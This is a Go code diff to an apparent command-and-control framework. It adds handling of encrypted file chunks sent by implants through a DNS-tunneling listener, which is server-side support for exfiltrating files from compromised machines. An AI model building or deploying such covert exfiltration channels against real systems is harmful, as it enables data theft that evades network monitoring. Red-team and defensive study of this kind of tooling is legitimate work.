@@ -22,6 +22,7 @@ import (
 	"github.com/uLl0a/lavianc2/internal/protocol"
 	"github.com/uLl0a/lavianc2/internal/sessions"
 	"github.com/uLl0a/lavianc2/internal/storage"
+	"github.com/uLl0a/lavianc2/internal/transfers"
 )
 
 // DNSListener implementa un listener DNS con tunneling TXT/A.
@@ -51,6 +52,7 @@ type DNSListener struct {
 	serverPriv *ecdh.PrivateKey
 
 	beaconMgr *beacons.Manager
+	transfers *transfers.Manager
 
 	// Estado interno.
 	server *dns.Server
@@ -86,6 +88,7 @@ func NewDNSListener(
 	bus *events.Bus,
 	serverKeys *crypto.ServerKeyStore,
 	beaconMgr *beacons.Manager,
+	transferMgr *transfers.Manager,
 	rekeyEvery uint64,
 	log *slog.Logger,
 ) (*DNSListener, error) {
@@ -112,6 +115,7 @@ func NewDNSListener(
 		bus:        bus,
 		log:        log,
 		serverKeys: serverKeys,
+		transfers:  transferMgr,
 		serverPriv: serverKeys.PrivateKey(),
 		beaconMgr:  beaconMgr,
 		profile:    profile,
@@ -132,6 +136,7 @@ func NewDNSListener(
 	l.router.MustRegister(protocol.MsgTaskResult, l.handleTaskResultEnvelope)
 	l.router.MustRegister(protocol.MsgHeartbeat, l.handleHeartbeatEnvelope)
 	l.router.MustRegister(protocol.MsgKeyRotation, l.handleKeyRotationEnvelope)
+	l.router.MustRegister(protocol.MsgFileChunk, l.handleFileChunkEnvelope)
 
 	bus.Subscribe(events.TopicImplantDead, func(ctx context.Context, ev events.Event) {
 		id, ok := ev.Payload.(uuid.UUID)
@@ -147,6 +152,42 @@ func NewDNSListener(
 	})
 
 	return l, nil
+}
+
+func (l *DNSListener) handleFileChunkEnvelope(ctx context.Context, env *protocol.Envelope) (*protocol.Envelope, error) {
+	var wrapper protocol.EncryptedWrapper
+	if err := json.Unmarshal(env.Payload, &wrapper); err != nil {
+		return nil, fmt.Errorf("file chunk: wrapper inválido: %w", err)
+	}
+	implantID, err := uuid.Parse(wrapper.ImplantID)
+	if err != nil {
+		return nil, fmt.Errorf("file chunk: implant_id inválido: %w", err)
+	}
+
+	sc, ok := l.crypto.Get(ctx, implantID)
+	if !ok {
+		return nil, fmt.Errorf("file chunk: sesión %s sin claves", implantID)
+	}
+	plaintext, err := sc.DecryptFromBeacon(wrapper.Data, nil)
+	if err != nil {
+		return nil, fmt.Errorf("file chunk: descifrar: %w", err)
+	}
+
+	var wire protocol.FileTransferWire
+	if err := json.Unmarshal(plaintext, &wire); err != nil {
+		return nil, fmt.Errorf("file chunk: unmarshal: %w", err)
+	}
+
+	if l.transfers != nil {
+		if err := l.transfers.Handle(ctx, &wire, implantID); err != nil {
+			l.log.Warn("file chunk: handle", "err", err, "kind", wire.Kind, "id", wire.TransferID)
+			return nil, fmt.Errorf("file chunk: %w", err)
+		}
+	}
+
+	// ACK simple. El cliente puede ignorarlo, pero confirmar la recepción
+	// de cada chunk permite en el futuro implementar retransmisiones.
+	return protocol.NewEnvelope(protocol.MsgFileChunk, []byte("ok")), nil
 }
 
 // Metadata devuelve la informacion identificativa del listener.
